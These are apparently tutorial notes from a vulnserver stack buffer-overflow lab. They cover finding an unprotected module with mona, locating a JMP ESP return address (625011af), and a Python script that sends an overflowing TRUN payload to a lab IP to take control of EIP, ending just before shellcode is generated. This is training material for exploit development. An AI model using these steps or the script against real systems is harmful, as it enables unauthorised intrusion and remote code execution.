- By finding the right module we mean that we're looking for a dll or something similar inside of a program without memory protection like no dep, no aslr, no safe seh, etc.
- Go to your attached vulnserver immunity debugger.
- Type in `!mona modules` in the little text bar at the bottom of the application.
- We can see some protection settings and that's ideal for us,
- A prime candidate immediately is this essfunc.dll and let's keep that in the back of our minds for now.
- Now let's find the opcode equivalent of jump, and to do so we type go to kali linux and type `locate nasm_shell` and go ahead and copy the ruby and paste and hit enter.
- So when we say we're looking for the opcode equivalent, we're trying to convert assembly language into hex code. 
- So what we'll do is, type this assembly language code `JMP ESP` which is a jump command.
- We'll use this as a pointer to jump to our malicious shell code.
- The Hex code equivalent of JMP command is FFE4. Let's take this FFE4 and go back to immunity and type `!mona find -s "\xff\xe4" -m essfunc.dll` in the bar underneath and hit enter.
	- -m for module
	- -s for opcode equivalent
- We've chosen this as it goes with the vulnserver program and has no memory protection.
- We're looking for return addresses here.
- Let's write down the list and find what works. 
- The first one says 625011af
- Go into kali and type exit in the nasm shell.
- Now we need to edit fuzz2.py
- Instead of having 4 B's in place of EIP, we're going to put this pointer there. So we're going to have the EIP be a JUMP code and this jump code is going to go to a malicious code.
- The file should look something like this:
```
#!/usr/bin/python3

import sys, socket

shellcode = "A"*2003  + "\xaf\x11\x50\x62"


try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('172.18.176.193',9999))

		payload= "TRUN /.:/" + shellcode
        s.send((payload.encode()))
        s.close()

except:
        print ("error Connecing to server")
        sys.exit()
```
- So if you notice the `"\xaf\x11\x50\x62"` is actually in reverse to the original 625011af for a special reason.
- So when we're talking with x86 architecture we're doing something called little endian format.
- x86 arch stores low order byte at the lowest address and high order byte at the higest address. Hence the reverse format.
- Now let's minimise the window we were working with in immunity debugger and maximize the window we dealt with all this while.
- Click on the button shown in the picture below and paste in 625011af.
- We find that it is associated to the hex code of JMP, ie, FFE4.
- Now press F2 on your keyboard and it turns blue. This sets your breakpoint.
- What this means is we're going to overflow the buffer but if we hit this specific spot, it's not going to jump further instruction, rather it will break the program and pause it right here for further information from us.
- Now hit play here and go back to kali and execute the script.
- We can see that breakpoint at essfunc.625011af has happened and our program has stopped which means we control the EIP and can be noticed in the registers as well in blue.
- Now all we need to do is generate some shell code and point EIP to it to get root access!